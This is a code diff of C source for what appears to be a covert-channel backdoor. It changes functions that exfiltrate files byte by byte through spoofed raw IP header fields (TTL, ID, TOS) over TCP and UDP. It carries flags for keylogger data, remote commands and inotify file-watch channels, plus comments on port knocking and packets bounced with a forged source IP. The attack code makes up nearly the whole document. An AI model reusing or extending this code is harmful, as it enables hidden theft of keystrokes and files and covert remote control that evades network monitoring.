@@ -48,6 +48,7 @@ void recv_results(char* sip, unsigned short sport, char* filename, bool tcp) {
     fclose(file);
 }
 
+//send file
 void send_results(char *sip, char *dip, unsigned short sport, unsigned short dport, char *filename, bool tcp) {
     FILE *file;
     char input;
@@ -63,18 +64,18 @@ void send_results(char *sip, char *dip, unsigned short sport, unsigned short dpo
 
     while((input = fgetc(file)) != EOF) {
         if(tcp){
-            printf("Sending: %c\n", input);
-            covert_send(sip, dip, sport, dport, (unsigned char *) &input, KEYLOGGER); //send the packet
+            covert_send(sip, dip, sport, dport, (unsigned char *) &input, COMMAND); //send the packet
         } else {
-            covert_udp_send(sip, dip, sport, dport, (unsigned char *) &input, 1);
+            covert_udp_send(sip, dip, sport, dport, (unsigned char *) &input, COMMAND);
         }
+
     }
 
     input = 0;  //send EOT (end of transmission) character
     if(tcp){
         covert_send(sip, dip, sport, dport, (unsigned char*) &input, EOT); //send the packet
     } else {
-        covert_udp_send(sip, dip, sport, dport, (unsigned char *) &input, 3);
+        covert_udp_send(sip, dip, sport, dport, (unsigned char *) &input, EOT);
     }
 
     fclose(file);
@@ -85,22 +86,18 @@ int rand_delay(int delay) {
     return rand() % delay + 1;
 }
 
-void covert_udp_send_data(char *sip, char *dip, unsigned short sport, unsigned short dport, char* data, int covert_channel){
+void covert_udp_send_data(char *sip, char *dip, unsigned short sport, unsigned short dport, char* data, int flag){
     unsigned char *buf = 0;
-    if(covert_channel == 1){
-        covert_udp_send(sip,dip,sport,dport,(unsigned char*) buf,4);
-        sleep(1);
-    }
 
     for(int i = 0; i<= (int)strlen(data); i++){
-        covert_udp_send(sip,dip,sport,dport,(unsigned char*) &data[i],1);
+        covert_udp_send(sip,dip,sport,dport,(unsigned char*) &data[i], flag);
     }
     //end of file
-    covert_udp_send(sip,dip,sport,dport,buf, 3);
+    covert_udp_send(sip,dip,sport,dport,buf, EOT);
 
 }
 
-void covert_udp_send(char *sip, char *dip, unsigned short sport, unsigned short dport, unsigned char* data, int covert_channel){
+void covert_udp_send(char *sip, char *dip, unsigned short sport, unsigned short dport, unsigned char* data, int flags){
     char datagram[4096] , source_ip[32] , *pseudoheader;
     int sending_socket;
     struct sockaddr_in sin;
@@ -123,31 +120,24 @@ void covert_udp_send(char *sip, char *dip, unsigned short sport, unsigned short 
     sin.sin_port = htons(dport);
     sin.sin_addr.s_addr = inet_addr (dip);
 
-    if(covert_channel == 0) {
-        ip_header->ttl = data[0];
-        ip_header->id = 'b';
-        printf("sending: %c\n", data[0]);
-        ip_header->tos = 'l';
-    }else if(covert_channel == 1) {
-        ip_header->ttl = data[0];
-        ip_header->id = 'b';
-        printf("sending: %c\n", data[0]);
-        ip_header->tos = 'l';
-    }else if(covert_channel == 2){
-        //key for port knocking
-        ip_header->ttl = 0;
-        ip_header->id = 'l';  //enter a single ASCII character into the field
-        ip_header->tos = 'b';
-    }else if(covert_channel == 3){
-        //close the connection
-        ip_header->ttl = 'x';
-        ip_header->id = 'x';  //enter a single ASCII character into the field
-        ip_header->tos = 'x';
-    }else if(covert_channel == 4){
-        ip_header->ttl = 'r';
-        ip_header->id = 'r';  //enter a single ASCII character into the field
-        ip_header->tos = 'r';
+    if(flags == DATA) {
+        //regular tcp covert channel
+        ip_header->id = DATA_KEY;
+        ip_header->tos = DATA_KEY;
+    }else if(flags == KEYLOGGER){
+        ip_header->id = KEYLOGGER_KEY;
+        ip_header->tos = KEYLOGGER_KEY;
+    }else if(flags == COMMAND){
+        ip_header->id = COMMAND_KEY;
+        ip_header->tos = COMMAND_KEY;
+    }else if(flags == INOTIFY){
+        ip_header->id = INOTIFY_KEY;
+        ip_header->tos = INOTIFY_KEY;
+    }else if(flags == EOT){
+        ip_header->id = EOT_KEY;
+        ip_header->tos = EOT_KEY;
     }
+    ip_header->ttl = data[0];
 
     ip_header->ihl = 5;
     ip_header->version = 4;
@@ -435,6 +425,8 @@ void covert_send(char *sip, char *dip, unsigned short sport, unsigned short dpor
                     return recv_tcp.tcp.seq;
 
                     //Bounced packets
+                    //client must send packet with server's source IP to another host.
+                    //flags: --client --sip <the server> --ack?
                     //client must send packet with server's source IP to another host.
                     //flags: --client --sip <the server> --ack?
                 } else if(ack == 1) {
